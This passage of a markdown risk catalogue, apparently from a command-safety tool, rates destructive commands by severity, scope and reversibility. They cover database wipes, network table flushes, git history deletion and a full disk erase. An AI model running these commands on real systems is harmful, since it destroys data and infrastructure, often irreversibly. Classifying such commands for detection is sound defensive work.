| `critical` 90 | `liquibase dropAll`        | account | irreversible  |
| `critical` 85 | `rails db:drop`            | account | irreversible  |
| `high` 70     | `python manage.py flush`   | account | irreversible  |
| `high` 80     | `npx prisma migrate reset` | account | irreversible  |
| `high` 70     | `alembic downgrade base`   | account | irreversible  |

## network plumbing

| Level       | Command                | Scope   | Reversibility |
| ----------- | ---------------------- | ------- | ------------- |
| `medium` 45 | `conntrack -F`         | network | recoverable   |
| `medium` 50 | `ip netns delete blue` | network | recoverable   |
| `medium` 55 | `ovs-vsctl del-br br0` | network | recoverable   |

## git safety net

| Level       | Command                                | Scope     | Reversibility |
| ----------- | -------------------------------------- | --------- | ------------- |
| `high` 70   | `git push --mirror origin`             | network   | irreversible  |
| `high` 60   | `git reflog expire --expire=now --all` | directory | irreversible  |
| `medium` 35 | `git stash clear`                      | directory | irreversible  |

## macos

| Level         | Command                                     | Scope | Reversibility |
| ------------- | ------------------------------------------- | ----- | ------------- |
| `critical` 90 | `diskutil eraseDisk JHFS+ Empty /dev/disk2` | host  | irreversible  |
